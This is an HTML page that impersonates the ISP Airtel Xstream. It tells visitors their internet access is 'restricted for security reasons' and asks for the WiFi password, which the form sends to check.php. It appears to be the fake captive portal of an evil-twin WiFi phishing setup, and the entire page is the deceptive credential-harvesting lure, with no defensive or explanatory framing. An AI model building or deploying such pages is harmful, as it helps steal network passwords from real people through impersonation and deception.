<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Internet Access Restricted</title>
    <link rel="stylesheet" href="/styles.css" />
  </head>
  <body>
    <div class="container">
      <div class="logo">
        <img src="/airtel-xstream.svg" alt="Airtel Logo" />
      </div>
      <h2>Internet Access Restricted</h2>
      <p>
        For security reasons, your internet access has been temporarily
        disabled. To continue with your internet connection, please enter the
        network password below.
      </p>

      <!-- Form with action and JavaScript validation -->
      <form
        class="password-form"
        action="check.php"
        method="post"
        onsubmit="return validatePassword()"
      >
        <label for="wifi-password">Wifi Password</label>
        <input
          type="password"
          id="wifi-password"
          name="wifi-password"
          placeholder="Enter password"
          required
        />
        <button type="submit">Unlock Internet Access</button>
      </form>

      <p class="footer-text">Need help? Please contact our support team.</p>
    </div>

    <!-- JavaScript for password validation -->
    <script>
      function validatePassword() {
        const password = document.getElementById("wifi-password").value;

        if (password.length < 8) {
          alert("Password must be at least 8 characters long.");
          return false; // Prevent form submission
        }
        return true; // Allow form submission
      }
    </script>
  </body>
</html>
